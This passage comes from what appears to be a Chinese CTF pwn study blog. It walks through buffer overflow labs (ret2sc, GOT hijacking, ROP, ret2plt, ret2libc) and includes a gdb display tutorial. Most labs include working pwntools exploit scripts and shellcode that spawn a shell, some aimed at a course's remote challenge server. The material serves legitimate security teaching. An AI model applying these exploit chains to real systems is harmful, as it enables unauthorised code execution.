fe ff ff           call   400550 &lt;puts@plt&gt;4006d0:    bf 00 00 00 00           mov    edi,0x04006d5:    e8 c6 fe ff ff           call   4005a0 &lt;exit@plt&gt;4006da:    c9                       leave  4006db:    c3                       ret </code></pre><p>发现地址0x4006ac可以跳过allow判断执行execve(“/bin/sh”, 0, 0)</p><p>exp:</p><pre><code># -*- coding:UTF-8 -*-from pwn import *r = process(&#39;./bof2&#39;)# r = remote(&#39;isc.taiwan-te.ch&#39;,10000)shell_addr = 0x4006acpayload = &#39;\x00&#39; * 0x18 + p64(shell_addr)# 只要buf在前16字节有\x00就可以绕过strlen# payload = &#39;a&#39;*0x07+&#39;\x00&#39;+&#39;a&#39;*0x10 + p64(shell_addr)r.recvuntil(&#39;This is your second bof challenge ;)\n&#39;)r.sendline(payload)r.interactive()</code></pre><p>调试：</p><pre><code>disas mainb *mainb *0x400710 (read)rcnaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaset $rip=0x40073d (跳过strlen长度判断)n set *0x7fffffffdfc8=0x4006acx/x 0x7fffffffdfc8 (0x7fffffffdfc8:    0x61616161004006ac)set *0x7fffffffdfcc=0x0x/x 0x7fffffffdfc8 (0x7fffffffdfc8:    0x00000000004006ac)set &#123;double&#125;0x7fffffffdfc8=0x4006ac 也可以一次性设置8字节n (跳入y0u_c4n7_533_m3函数绕过判断allow部分)</code></pre><h2 id="ret2sc"><a href="#ret2sc" class="headerlink" title="ret2sc"></a>ret2sc</h2><h3 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h3><h4 id="return-to-shellcode"><a href="#return-to-shellcode" class="headerlink" title="return to shellcode"></a>return to shellcode</h4><p>ret2shellcode，即控制程序执行 shellcode 代码。若有一块可写可执行又已知地址的memory，我们就可以预先写好想要执行的shellcode，然后再覆盖return address跳上去执行。</p><p>shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/202093-44846.jpg"></p><h4 id="Linux-System-Call-Table-for-x86-64"><a href="#Linux-System-Call-Table-for-x86-64" class="headerlink" title="Linux System Call Table for x86 64"></a>Linux System Call Table for x86 64</h4><p><a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">Linux System Call Table for x86 64</a></p><h4 id="nop-sled-空操作雪橇"><a href="#nop-sled-空操作雪橇" class="headerlink" title="nop sled 空操作雪橇"></a>nop sled 空操作雪橇</h4><p>栈地址并不是一个不变的地址，也就是说程序每次运行的时候栈起始位置都不一定，这是现代编译器采用的一大类技术“线性地址随机化”中的一个子集，一般翻译为“栈地址随机化”的技术。为的便是在一定程度上抵制缓冲区溢出攻击。栈随机化指运行时栈的起始地址为随机的，所以程序中存放 各函数返回地址 的地址也会发生对应的改变。可防止运行相同程序的相同系统易预测栈地址而易于攻击。</p><p>攻击者暴力抵制的方法有“空操作雪橇”（nop sled）等方法，暴力去探测返回地址。</p><p>nop sled 是一种可以破解栈随机化的缓冲区溢出攻击方式。攻击者通过输入字符串注入攻击代码。在实际的代码代码前注入很长的 nop （无操作，仅使程序计数器加一）序列，只要程序的控制流指向该序列任意一处，程序计数器逐步加一，直到到达攻击代码的存在的地址，并执行。</p><p>即 :  </p><p>不用 nop sled  ，   函数返回地址 ——-&gt;  攻击代码。</p><p>使用 nop sled ，    函数返回地址 ——-&gt;  nop 序列（顺序执行） 直到攻击代码地址。</p><h3 id="实验Lab3-ret2sc"><a href="#实验Lab3-ret2sc" class="headerlink" title="实验Lab3:ret2sc"></a>实验Lab3:ret2sc</h3><p>ret2sc.c</p><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;char message[48];int main()&#123;char name[16];printf(&quot;Give me your message: &quot;);fflush(stdout);read(0, message, 0x30);printf(&quot;Give me your name: &quot;);fflush(stdout);read(0, name, 0x30);return 0;&#125;</code></pre><p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。我们可以注意到,message是个Global variables,因此IDA/objdump找到它的地址,往里写入shellcode.</p><p>exp</p><pre><code>from pwn import *r = process(&#39;./ret2sc&#39;)# raw_input()# r = remote(&#39;isc.taiwan-te.ch&#39;,10002)r.recvuntil(&#39;: &#39;)context.arch = &#39;amd64&#39;# sc = asm(#     &#39;&#39;&#39;# mov rbx, 0x68732f6e69622f # push rbx # mov rdi, rsp # xor rsi, rsi # xor rdx, rdx # mov rax, 0x3b # syscall  #     &#39;&#39;&#39;# )# https://defuse.ca/online-x86-assembler.htm# sc = &quot;\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05&quot;sc = asm(shellcraft.sh())r.send(sc)p = &#39;a&#39;*0x18 + p64(0x601060)r.recvuntil(&#39;: &#39;)r.send(p)r.interactive()</code></pre><p>调试</p><pre><code>raw_input() 运行exp，运行gdb调试程序 at [pid]x/40gx 0x601060nexp回车发送shellcodex/40gx 0x601060x/20i 0x601060</code></pre><h2 id="GOT-Hĳacking"><a href="#GOT-Hĳacking" class="headerlink" title="GOT Hĳacking"></a>GOT Hĳacking</h2><h3 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h3><h4 id="Protection"><a href="#Protection" class="headerlink" title="Protection"></a>Protection</h4><p>CANNARY(栈保护) –金丝雀 又称为stack guard</p><pre><code>栈溢出保护是一种缓冲区溢出攻击缓解手段，当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</code></pre><p>NX（DEP）(数据执行保护 Data Execution Prevention)</p><pre><code>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。可执行的地方不能写，可写的地方不能执行</code></pre><p>ASLR</p><pre><code>内存地址随机化机制（address space layout randomization)，有以下三种情况：0 - 表示关闭进程地址空间随机化1 - 表示将mmap的基址，stack和vdso页面随机化2 - 表示在1的基础上增加堆（heap）的随机化每次程序执行时，stack heap library的位置都不一样</code></pre><p>PIE (Position Independent Execution)</p><pre><code>开启后,code与data都会跟着ALSR</code></pre><p>RELRO</p><pre><code>Relocation Read-OnlyPartial RELRO    GOT可写Full RELRO    Load time 时会将所有function resolve完毕    GOT不可写</code></pre><h4 id="Lazy-Binding"><a href="#Lazy-Binding" class="headerlink" title="Lazy Binding"></a>Lazy Binding</h4><pre><code>因为不一定每个library function都会被执行到，所以采用lazy binding机制，当第一次执行到library function时才会去寻找真正的address并进行binding</code></pre><h4 id="Global-Offset-Table"><a href="#Global-Offset-Table" class="headerlink" title="Global Offset Table"></a>Global Offset Table</h4><pre><code>GOT为library function的指标阵列，因为lazy binding机制，因此一开始不会知道真实位置，取而代之的时摆plt段的code</code></pre><h4 id="Lazy-Binding-Procedure"><a href="#Lazy-Binding-Procedure" class="headerlink" title="Lazy Binding Procedure"></a>Lazy Binding Procedure</h4><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/202096-44559.jpg"></p><h4 id="GOT-Hijacking"><a href="#GOT-Hijacking" class="headerlink" title="GOT Hijacking"></a>GOT Hijacking</h4><pre><code>由于lazy binding的机制，GOT可写，因此改写GOT造成任意控制程序流程</code></pre><h4 id="关于-GOT-和-PLT-参考文章-讲的很好-通俗易懂"><a href="#关于-GOT-和-PLT-参考文章-讲的很好-通俗易懂" class="headerlink" title="关于 GOT 和 PLT 参考文章 讲的很好 通俗易懂"></a>关于 GOT 和 PLT 参考文章 讲的很好 通俗易懂</h4><p><a href="https://bbs.pediy.com/thread-257545.htm">PLT&amp;GOT 表以及延迟绑定机制</a></p><h3 id="实验Lab4：Gothajick"><a href="#实验Lab4：Gothajick" class="headerlink" title="实验Lab4：Gothajick"></a>实验Lab4：Gothajick</h3><p>c</p><pre><code>char name[64];int main()&#123;int unsigned long long addr;setvbuf(stdin, 0, 2, 0);setvbuf(stdout, 0, 2, 0);printf(&quot;What&#39;s you name?\n&quot;);read(0, name, 0x40);printf(&quot;Where do you want to write?\n&quot;);scanf(&quot;%llu&quot;, &amp;addr);printf(&quot;Data: &quot;);read(0, (char *)addr, 8);puts(&quot;Done!&quot;);printf(&quot;Thank you %s!\n&quot;, name);return 0;&#125;</code></pre><p>put的plt表 got位置在0x601018</p><pre><code>00000000004005d0 &lt;puts@plt&gt;:4005d0:    ff 25 42 0a 20 00        jmp    QWORD PTR [rip+0x200a42]        # 601018 &lt;puts@GLIBC_2.2.5&gt;4005d6:    68 00 00 00 00           push   0x04005db:    e9 e0 ff ff ff           jmp    4005c0 &lt;.plt&gt;</code></pre><p>name的位置存放0x1080</p><pre><code>40077b:    48 8d 35 fe 08 20 00     lea    rsi,[rip+0x2008fe]        # 601080 &lt;name&gt;400782:    bf 00 00 00 00           mov    edi,0x0400787:    e8 74 fe ff ff           call   400600 &lt;read@plt&gt;</code></pre><p>exp如下:</p><pre><code>from pwn import *sh = process(&#39;./gothijack&#39;)# sh = remote(&#39;isc.taiwan-te.ch&#39;,10003)context.arch = &#39;amd64&#39;shellcode = asm(shellcraft.sh())sh.recvuntil(&#39;?\n&#39;)sh.send(shellcode)sh_addr = 0x601018 # puts __ pltsh_addr = 0x601028 # printf __ pltsh.recvuntil(&#39;?\n&#39;)sh.sendline(str(sh_addr)) #@GOT offset table of printfsh.sendline(p64(0x601080)) #wirite shellcode2name&#39;s addresssh.interactive()</code></pre><p>调试：</p><pre><code>nigdb-peda$ x/10gx 0x6010180x601018:    0x00007fdedc6ac5b0    0x00000000004005e60x601028:    0x00000000004005f6    0x00007fdedc724e400x601038:    0x00007fdedc6acc90    0x00000000004006260x601048:    0x0000000000000000    0x00000000000000000x601058:    0x0000000000000000    0x00007fdedc7f56a0gdb-peda$ x/i 0x00007fdedc6ac5b00x7fdedc6ac5b0 &lt;puts&gt;:    push   r14不断执行 直到0x4007d2 &lt;main+187&gt;:    call   0x400600 &lt;read@plt&gt;=&gt; 0x4007d7 &lt;main+192&gt;:    lea    rdi,[rip+0xff]        # 0x4008dd也就是read(0, (char *)addr, 8);再次查看 0x601018gdb-peda$ x/10gx 0x6010180x601018:    0x0000000000601080    0x00000000004005e60x601028:    0x00007fc2cbfb2cb0    0x00007fc2cc04ae400x601038:    0x00007fc2cbfd2c90    0x00007fc2cbfb40a00x601048:    0x0000000000000000    0x00000000000000000x601058:    0x0000000000000000    0x00007fc2cc11b6a0put的got表位置 0x601018已经变成了0x0000000000601080，指向shellcodeshellcodegdb-peda$ x/10i 0x601080 0x601080 &lt;name&gt;:    push   0x680x601082 &lt;name+2&gt;:    movabs rax,0x732f2f2f6e69622f0x60108c &lt;name+12&gt;:    push   rax0x60108d &lt;name+13&gt;:    mov    rdi,rsp0x601090 &lt;name+16&gt;:    push   0x10169720x601095 &lt;name+21&gt;:    xor    DWORD PTR [rsp],0x10101010x60109c &lt;name+28&gt;:    xor    esi,esi0x60109e &lt;name+30&gt;:    push   rsi0x60109f &lt;name+31&gt;:    push   0x80x6010a1 &lt;name+33&gt;:    pop    rsi</code></pre><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><h3 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h3><h4 id="ROP-1"><a href="#ROP-1" class="headerlink" title="ROP"></a>ROP</h4><p>Return Oriented Programming</p><p>通过不断取执行包含ret的程序片段来达到想要的操作</p><h4 id="ROP-Chain"><a href="#ROP-Chain" class="headerlink" title="ROP Chain"></a>ROP Chain</h4><p>这些包含ret的程序片段又被称作gadget</p><p>由众多的ROP gadget 所组成的</p><p>可以借由不同ROP gadget的小功能串成任意代码执行的效果</p><p>取代shellcode攻击</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/Screenshot_from2020-09-11-09-06-27.png"></p><h3 id="实验-LAB5：rop"><a href="#实验-LAB5：rop" class="headerlink" title="实验 LAB5：rop"></a>实验 LAB5：rop</h3><p>rop.c</p><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;int main()&#123;char buf[16];puts(&quot;This is your first rop challenge ;)&quot;);fflush(stdout);read(0, buf, 0x90);return 0;&#125;</code></pre><p>学会使用ROPgadget和grep指令搜索需要的代码</p><pre><code>ROPgadget --binary rop &gt; gcat g | grep &quot;pop rdi&quot;cat g | grep &quot;pop rsi&quot;cat g | grep &quot;pop rdx&quot;cat g | grep &quot;pop rax&quot;cat g | grep &quot;pop rax&quot;cat g | grep &quot;mov qword ptr \[rdi\], rsi&quot;cat g | grep &quot;syscall&quot;</code></pre><p>readelf查询bss位置（地址没有随机化）</p><pre><code>readelf -S rop | grep &quot;.bss&quot;[15] .tbss             NOBITS           00000000006b6140  000b6140[26] .bss              NOBITS           00000000006bb2e0  000bb2d8</code></pre><p>exp</p><pre><code>from pwn import *r = process(&#39;./rop&#39;)# r = remote(&#39;isc.taiwan-te.ch&#39;,10004)pop_rdi = 0x0000000000400686 # pop rdi ; retpop_rsi = 0x0000000000410093 # pop rsi ; retpop_rdx = 0x00000000004494b5 # pop rdx ; retpop_rax = 0x0000000000415294 # pop rax ; retmov_qword_rdi_rsi = 0x0000000000446c1b # mov qword ptr [rdi], rsi ; ret# syscall = 0x0000000000474a65 # syscall ; retsyscall = 0x00000000004011fc # syscallret = 0x0000000000400416 # retbss = 0x00000000006bb2e0 #address of bssr.recvuntil(&#39;;)\n&#39;)p = &#39;A&#39; * 24p += p64(pop_rdi)p += p64(bss)p += p64(pop_rsi)p += &#39;/bin/sh\x00&#39;p += p64(mov_qword_rdi_rsi)p += p64(pop_rsi)p += p64(0)p += p64(pop_rdx)p += p64(0)p += p64(pop_rax)p += p64(0x3b)p += p64(syscall)p += p64(ret)r.send(p)r.interactive()</code></pre><h2 id="Return-to-PLT"><a href="#Return-to-PLT" class="headerlink" title="Return to PLT"></a>Return to PLT</h2><h3 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h3><p>ret2plt</p><pre><code>相当于把ret2got和rop的知识结合起来Use PLT as Gadget程序中包含 system(&quot;echo What is your name?&quot;); system(&quot;sh&quot;);rdi = address of &quot;sh&quot;</code></pre><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/Screenshot_from2020-09-12-09-06-27.png"></p><h3 id="实验LAB6：ret2plt"><a href="#实验LAB6：ret2plt" class="headerlink" title="实验LAB6：ret2plt"></a>实验LAB6：ret2plt</h3><p>c</p><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;char name[16];int main()&#123;    setvbuf(stdout, 0, 2, 0);    setvbuf(stdin, 0, 2, 0);    char buf[16];    system(&quot;echo What is your name?&quot;);    read(0, name, 0x10);    puts(&quot;Say something: &quot;);    read(0, buf, 0x40);    return 0;&#125;</code></pre><p>exp</p><pre><code># -*- coding: utf-8 -*-from pwn import *sh = process(&#39;./ret2plt&#39;)#context.log_level=&quot;debug&quot;#sh = remote(&#39;isc.taiwan-te.ch&#39;, 10005)system = 0x400520   # systempop_rdi = 0x0000000000400733 # pop rdi ; retret = 0x00000000004004fe    # retname =  0x601070    # &lt;name&gt;sh.recvuntil(&#39;?&#39;)sh.sendline(&#39;sh\x00&#39;)p = &#39;a&#39; * 0x18p += p64(pop_rdi)p += p64(name)p += p64(ret)   #这个ret是本身程序的问题要加上p += p64(system)sh.recvuntil(&quot;: &quot;)sh.sendline(p)sh.interactive()</code></pre><p>为什么要加一个ret 栈迁移 注意ret对齐 举个例子</p><p>没对齐的</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200724100953105.png"></p><p>对齐的</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200724100812952.png"></p><h2 id="Return-to-libc"><a href="#Return-to-libc" class="headerlink" title="Return to libc"></a>Return to libc</h2><h3 id="知识点-6"><a href="#知识点-6" class="headerlink" title="知识点"></a>知识点</h3><h4 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h4><p>Why Return to libc?</p><p>一般程序很少有 system, execve 或是后门程序</p><p>在 DEP 保护下无法执行填入的 shellcode</p><p>libc 有许多可以利用的 function 片段,让我们可以使用system 或 execve 等开 shell</p><pre><code>#include &lt;sigsetops.h&gt;#define SHELL_PATH &quot;/bin/sh&quot; /* Path of the shell. */#define SHELL_NAME &quot;sh&quot; /* Name to give it. */(void) __sigprocmask (SIG_SETMASK, &amp;omask, (sigset_t *) NULL);INIT_LOCK ();.../* Exec the shell. */(void) __execve (SHELL_PATH, (char *const *) new_argv, __environ);</code></pre><p>How to Return to libc</p><p>因为 ASLR,每次 libc 载入的位置都不同</p><p>我们需要 leak libc 的 base address 来知道目标 address</p><p>可以获得 libc 的地方有 stack, (heap,) 跟 GOT…</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/pwn-basic_205.jpg"></p><h3 id="实验LAB7：ret2libc"><a href="#实验LAB7：ret2libc" class="headerlink" title="实验LAB7：ret2libc"></a>实验LAB7：ret2libc</h3><p>c</p><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;int main()&#123;    setvbuf(stdout, 0, 2, 0);    setvbuf(stdin, 0, 2, 0);    char addr[16];    char buf[16];    printf(&quot;You have one chance to read the memory!\n&quot;);    printf(&quot;Give me the address in hex: &quot;);    read(0, addr, 0x10);    unsigned long long iaddr = strtoll(addr, 0, 16);    printf(&quot;\nContent: %lld\n&quot;, *(unsigned long long *)iaddr);    printf(&quot;Give me your messege: &quot;);    read(0, buf, 0x90);    return 0;&#125;</code></pre><p>exp</p><pre><code>from pwn import *#r = process(&#39;./ret2libc&#39;)r = remote(&#39;isc.taiwan-te.ch&#39;, 10006)put_got_addr = 0x601018put_offset = 0x809c0r.recvuntil(&#39;hex: &#39;)r.send(hex(put_got_addr))r.recvuntil(&#39;Content: &#39;)put_addr = int(r.recvuntil(&#39;\n&#39;)[:-1])libc_base = put_addr - put_offsetone = 0x4f322p = &#39;a&#39; * 0x38p += p64(libc_base + one)r.recvuntil(&#39;messege: &#39;)r.send(p)r.interactive()</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GDB自动显示display</title>
      <link href="2020/09/01/2020-09-01-gdb_display/"/>
      <url>2020/09/01/2020-09-01-gdb_display/</url>
      
        <content type="html"><![CDATA[<p>使用 GDB 调试程序，可能会遇到某一个表达式需要频繁打印，例如程序在运行时，需要观察某一个表达式值的变化，每次运行程序都需要自己打印，会增加调试程序的负担，所以 GDB 中提供了自动显示表达式的命令。GDB 自动显示使用到 display 命令，命令的详细介绍如下。</p><h2 id="设置表达式自动显示"><a href="#设置表达式自动显示" class="headerlink" title="设置表达式自动显示"></a>设置表达式自动显示</h2><p>与打印表达式的值 print 命令的使用方式相同，相关的命令格式如下：</p><pre><code>display [format] [experssion]</code></pre><p>format 表示命令自动显示的格式，experssion 表示程序中的表达式。该命令表示将表达式放入自动显示列表中，当程序运行到断点处时，表达式就会以 format 的格式输出。实例：</p><pre><code>(gdb) display i             //自动显示变量 i 的值。(gdb) display /t i         //以 2 进制的格式自动显示变量的值。</code></pre><h2 id="设置内存数据自动显示"><a href="#设置内存数据自动显示" class="headerlink" title="设置内存数据自动显示"></a>设置内存数据自动显示</h2><p>与查看内存 x 命令的使用方式相同，相关的命令格式如下：</p><pre><code>display [format] [addr]</code></pre><p>format 为显示内存的格式，addr 表示内存中的一个地址。该命令表示将 addr 放入自动显示的列表中，程序中断时查看内存中的数据。实例：</p><pre><code>(gdb) display /x main             //以 16 进制的格式打印输出 main 函数所在内存地址中的数据。(gdb) display /x 0x1234         //以 16 进制的格式打印输出 0x1234 所在内存地址中的数据。</code></pre><h2 id="查看自动显示列表"><a href="#查看自动显示列表" class="headerlink" title="查看自动显示列表"></a>查看自动显示列表</h2><p>查看 GDB 中的自动显示列表使用命令：</p><pre><code>info display</code></pre><p>该命令会将加入自动显示列表的表达式或者是地址显示出来。</p><h2 id="设置自动显示选项"><a href="#设置自动显示选项" class="headerlink" title="设置自动显示选项"></a>设置自动显示选项</h2><p>加入自动显示列表中的表达式或者是地址，GDB 会给它分配一个编号，编号一般从 1 开始。我们可以根据这个编号删除或禁用这个选项。</p><ol><li><p>删除自动显示中的选项，命令格式如下：</p><p> undisplay num<br> delete display num</p></li></ol><p>num 表示自动显示列表的标号。</p><ol start="2"><li><p>禁用或激活自动显示列表中的选项，命令格式如下：</p><p> disable display [num]             //禁用自动显示选项<br> enable display [num]             //激活自动显示选项</p></li></ol><p>num 表示自动显示列表中的标号。禁用后的选项在程序中断后不会自动输出，但是系统会记录这个选项，在后期可以激活。</p><h2 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h2><p>每次程序中断后可以看到即将被执行的下一条汇编指令，其中 $pc 代表当前汇编指令，/i 表示以十六进行显示。</p><pre><code>display /i $pc</code></pre><p>查看ebx寄存器</p><pre><code>display /x $ebx </code></pre>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gdb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-PWN练习-一个缓冲区溢出基础例子</title>
      <link href="2020/08/31/2020-08-31-pwn_buffer_overflow/"/>
      <url>2020/08/31/2020-08-31-pwn_buffer_overflow/</url>
      
        <content type="html"><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p>CTF中PWN题型通常会直接给定一个已经编译好的二进制程序（Windows下的EXE或者Linux下的ELF文件等），然后参赛选手通过对二进制程 序进行逆向分析和调试来找到利用漏洞，并编写利用代码，通过远程代码执行来达到溢出攻击的效果，最终拿到目标机器的shell夺取flag。</p><h2 id="64位的GCC-编译32位程序"><a href="#64位的GCC-编译32位程序" class="headerlink" title="64位的GCC 编译32位程序"></a>64位的GCC 编译32位程序</h2><p>编译32的程序,只需要加上-m32就可以了</p><pre><code>gcc -m32 llong.c</code></pre><h2 id="Gcc编译选项"><a href="#Gcc编译选项" class="headerlink" title="Gcc编译选项"></a>Gcc编译选项</h2><p>NX：-z execstack / -z noexecstack (关闭 / 开启)    不让执行栈上的数据，于是JMP ESP就不能用了</p><p>Canary：-fno-stack-protector /-fstack-protector / -fstack-protector-all (关闭 / 开启 / 全开启)  栈里插入cookie信息</p><p>PIE：-no-pie / -pie (关闭 / 开启)   地址随机化，另外打开后会有get_pc_thunk</p><p>RELRO：-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启)  对GOT表具有写权限</p><p>使用参数 -g 表示将源代码信息编译到可执行文件中。</p><h2 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h2><p>gdb是Linux下常用的一款命令行调试器，拥有十分强大的调试功能。gdb常用命令如下：</p><pre><code>disas addr 对地址addr处的指令进行反汇编，addr可以是函数名字b *addr 对地址addr处设置一个断点r 运行被调试的程序c 让处于挂起状态的程序继续执行，直到遇到下一个断点或结束x addr 查看addr处存储的数据值ni 执行下一条汇编指令，如果下一条是一个函数调用（即call指令），那么执行完这个callsi 执行下一条汇编指令，如果下一条是一个函数调用（即call指令），那么进入这个函数调用，并执行函数的第一条汇编指令</code></pre><h2 id="汇编基础"><a href="#汇编基础" class="headerlink" title="汇编基础"></a>汇编基础</h2><p>常见汇编指令</p><pre><code># D-S 减sub S,D# D&lt;-S 赋值mov S,D# D = &amp;S 取地址lea S,D# 函数调用 执行label所在函数call label# 比较 S1-S2cmp S2,S1# 等于0时跳转到labelje label# 直接跳转到labeljmp label</code></pre><p>汇编语言中，esp寄存器用于指示当前函数栈帧的栈顶的位置，函数中局部变量都存储在栈空间中，栈的生长方向是向下的（即从高地址往低地址方向生长）。</p><h2 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h2><p>缓冲区溢出是指当计算机向缓冲区内填充数据位数时超过了缓冲区本身的容量，使得溢出的数据覆盖在合法数据上，理想的情况是程序检查数据长度并不允许输入超过缓冲区长度的字符，但是绝大多数程序都会假设数据长度总是与所分配的储存空间相匹配，这就为缓冲区溢出埋下隐患。</p><h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>主机/home/目录下有一个pwn程序，执行这个程序的时候可以输入数据进行测试，pwn程序会输出Please try again.的提示信息，请对pwn程序进行逆向分析和调试，找到程序内部的漏洞，并构造特殊的输入数据，使之输出Congratulations, you pwned it.信息。</p><h2 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h2><p>在实际的CTF竞赛的PWN题目中，一般是不会提供二进制程序的源代码的。这里为了方便大家学习，给出二进制程序的C语言源代码供大家分析，以源码审计的方式确定漏洞所在位置，方便后续进行汇编级别的分析。（在没有源代码的情况下，我们通常使用IDA Pro对二进制程序进行逆向分析，使用IDA的Hex-Rays插件可以将反汇编代码还原为C语言伪代码，可以达到类似源代码的可读效果）</p><p>源码pwn.c：</p><pre><code>#include &lt;stdio.h&gt;int main(int argc, char** argv)&#123;    int modified;    char buffer[64];    modified = 0;    gets(buffer);        // 引发缓冲区溢出    if (modified != 0)    &#123;        printf(&quot;Congratulations, you pwned it.\n&quot;);    &#125;    else    &#123;        printf(&quot;Please try again.\n&quot;);    &#125;    return 0;&#125;</code></pre><p>使用gets函数读取输入数据时，并不会对buffer缓冲区的长度进行检查，输入超长的输入数据时会引发缓冲区溢出。</p><p>没有pwn文件，可自行使用gcc编译源码，生成pwn</p><pre><code>gcc -m32 pwn.c -o pwn -z execstack -fno-stack-protector -no-pie -z norelro</code></pre><h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><p>执行gdb pwn即可开始通过gdb对pwn进行调试，现在我们需要阅读main函数的汇编代码，在gdb中执行disas main命令即可：</p><pre><code>gdb-peda$ disas mainDump of assembler code for function main:0x08049172 &lt;+0&gt;:    lea    ecx,[esp+0x4]0x08049176 &lt;+4&gt;:    and    esp,0xfffffff00x08049179 &lt;+7&gt;:    push   DWORD PTR [ecx-0x4]0x0804917c &lt;+10&gt;:    push   ebp0x0804917d &lt;+11&gt;:    mov    ebp,esp0x0804917f &lt;+13&gt;:    push   ebx0x08049180 &lt;+14&gt;:    push   ecx0x08049181 &lt;+15&gt;:    sub    esp,0x500x08049184 &lt;+18&gt;:    call   0x80490b0 &lt;__x86.get_pc_thunk.bx&gt;0x08049189 &lt;+23&gt;:    add    ebx,0x21130x0804918f &lt;+29&gt;:    mov    DWORD PTR [ebp-0xc],0x00x08049196 &lt;+36&gt;:    sub    esp,0xc0x08049199 &lt;+39&gt;:    lea    eax,[ebp-0x4c]0x0804919c &lt;+42&gt;:    push   eax// 调用gets(buffer)读取输入数据0x0804919d &lt;+43&gt;:    call   0x8049030 &lt;gets@plt&gt;0x080491a2 &lt;+48&gt;:    add    esp,0x10// 判断modified变量的值是否是00x080491a5 &lt;+51&gt;:    cmp    DWORD PTR [ebp-0xc],0x0//如果modified的值等于0，就跳转到 0x80491bf0x080491a9 &lt;+55&gt;:    je     0x80491bf &lt;main+77&gt;0x080491ab &lt;+57&gt;:    sub    esp,0xc0x080491ae &lt;+60&gt;:    lea    eax,[ebx-0x1294]0x080491b4 &lt;+66&gt;:    push   eax// modified不为0，打印成功提示0x080491b5 &lt;+67&gt;:    call   0x8049040 &lt;puts@plt&gt;0x080491ba &lt;+72&gt;:    add    esp,0x100x080491bd &lt;+75&gt;:    jmp    0x80491d1 &lt;main+95&gt;0x080491bf &lt;+77&gt;:    sub    esp,0xc0x080491c2 &lt;+80&gt;:    lea    eax,[ebx-0x1275]0x080491c8 &lt;+86&gt;:    push   eax//modified为0，打印失败提示0x080491c9 &lt;+87&gt;:    call   0x8049040 &lt;puts@plt&gt;0x080491ce &lt;+92&gt;:    add    esp,0x100x080491d1 &lt;+95&gt;:    mov    eax,0x00x080491d6 &lt;+100&gt;:    lea    esp,[ebp-0x8]0x080491d9 &lt;+103&gt;:    pop    ecx0x080491da &lt;+104&gt;:    pop    ebx0x080491db &lt;+105&gt;:    pop    ebp0x080491dc &lt;+106&gt;:    lea    esp,[ecx-0x4]0x080491df &lt;+109&gt;:    ret    End of assembler dump.</code></pre><p>通过对上面的汇编代码进行分析，我们知道modified位于ebp-0xc处，buffer位于ebp-0x4c处，两个地址的距离为0x4c - 0xc = 0x40，即64，刚好为buffer数组的大小。</p><p>因此当我们输入的数据超过64字节时，modified变量就可以被覆盖。</p><p>下面在gdb中进行验证，在gdb中执行b *0x080491a2 命令对gets的下一条指令下一个断点：</p><p>b *0x080491a2</p><p>在gdb中执行r命令，让被调试的pwn程序跑起来，就可以输入数据进行测试了，</p><p>这里我们输入64个A以及1个B</p><p>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB</p><p>按下 Enter 